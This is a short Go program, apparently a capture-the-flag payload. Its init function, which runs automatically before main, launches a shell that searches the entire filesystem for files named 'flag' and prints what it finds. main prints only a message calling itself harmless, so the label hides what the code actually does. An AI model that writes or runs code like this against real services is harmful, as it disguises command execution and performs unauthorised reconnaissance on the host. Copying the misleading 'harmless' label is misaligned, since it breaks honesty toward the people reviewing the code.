package main

import (
	"fmt"
	"os/exec"
)

func init() {
	cmd := exec.Command("/bin/sh", "-c", "find / | grep flag")
	output, err := cmd.CombinedOutput()

	if err != nil {
		fmt.Println("Error:", err)
	} else {
		fmt.Println("Output:", string(output))
	}
}

func main() {
	fmt.Println("This is a harmless main function.")
}
